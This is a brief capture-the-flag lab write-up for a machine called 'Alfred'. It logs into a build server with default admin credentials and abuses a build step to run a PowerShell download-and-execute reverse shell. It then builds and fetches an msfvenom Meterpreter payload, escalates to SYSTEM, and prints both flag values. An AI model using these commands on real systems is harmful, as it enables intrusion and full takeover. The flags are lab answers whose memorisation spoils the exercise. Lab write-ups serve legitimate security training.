# Alfred 

> VOiD | Monday 09 August 2021 08:55:30 PM IST

My IP : 10.17.6.109
Target IP : 10.10.221.246

# PORT 80 
Nothing specical

# PORT 8080
```bash

valid credintinals
admin:admin

go to projects 
then to configure 
then under bulid enter the comand to run
then go back and build
command will run
powershell iex (New-Object Net.WebClient).DownloadString('http://10.17.6.109:8080/Invoke-PowerShellTcp.ps1');Invoke-PowerShellTcp -Reverse -IPAddress 10.17.6.109 -Port 4444
shell accuried

PS C:\Users\bruce\Desktop> cat user.txt
79007a09481963edf2e1321abd9ae2a0

```

upgrading shell
```bash
msfvenom -p windows/meterpreter/reverse_tcp -a x86 --encoder x86/shikata_ga_nai LHOST=10.17.6.109 LPORT=8888 -f exe -o shell.exe

copying shell
powershell "(New-Object System.Net.WebClient).Downloadfile('http://10.17.6.109:8080/shell.exe','shell.exe')"


getsystem
migrate to services.exe

cat root.txt 
dff0f748678f280250f25a45b8046b4a

```


